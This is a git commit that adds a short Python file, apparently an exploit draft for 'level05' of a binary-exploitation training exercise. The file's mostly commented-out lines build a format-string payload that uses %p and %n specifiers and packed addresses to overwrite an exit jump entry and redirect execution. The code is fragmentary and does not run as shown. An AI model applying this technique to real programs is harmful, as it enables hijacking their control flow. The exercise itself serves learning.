cebe500ff260989dad22b2f4323b27a926946d74
dsamain <delphin.samain@gmail.com>
2022-12-03 07:53:20 +0100

    yes

---
+++ level05/exp.py
@@ -0,0 +1,5 @@
+import struct
+#padding = "%.42BCCCCDDDDEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %n"
+#padding =  "%.134513886dEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %n %p %p"
+# #exit jmp : 0x80497e0
+# addr = struct.pack("I", 0x80497e0)                                                                                                                                                                                                              #char to print : 0x080484de                                                                                                                                                                                                                     print addr + padding 
